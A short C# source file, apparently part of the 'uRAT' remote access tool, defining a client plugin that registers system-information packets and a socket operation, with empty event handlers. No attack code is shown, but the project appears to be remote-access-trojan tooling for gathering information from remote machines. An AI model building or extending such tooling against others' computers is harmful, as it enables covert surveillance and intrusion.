using System.Collections.Generic;
using uNet2.Packet;
using uNet2.Packet.Events;
using uNet2.SocketOperation;
using uRAT.Client.Plugin.Client;
using uRAT.CoreClientPlugin.BasicSystemInformation.Operations;
using uRAT.CoreClientPlugin.BasicSystemInformation.Packets;

namespace uRAT.CoreClientPlugin.BasicSystemInformation
{
    public class BasicSystemInformationClientPlugin : IClientPlugin
    {
        public List<IPacket> PluginPackets
        {
            get
            {
                return new List<IPacket>
                {
                    new SystemInformationPacket(),
                    new SystemInformationInitPacket()
                };
            }
        }

        public List<ISocketOperation> SocketOperations
        {
            get
            {
                return new List<ISocketOperation>
                {
                    new BasicSystemInformationOperation()
                };
            }
        }

        public void Initialize()
        {
        }

        public void OnClientConnected()
        {

        }

        public void OnPacketReceived(object sender, ClientPacketEventArgs e)
        {
            
        }
    }
}
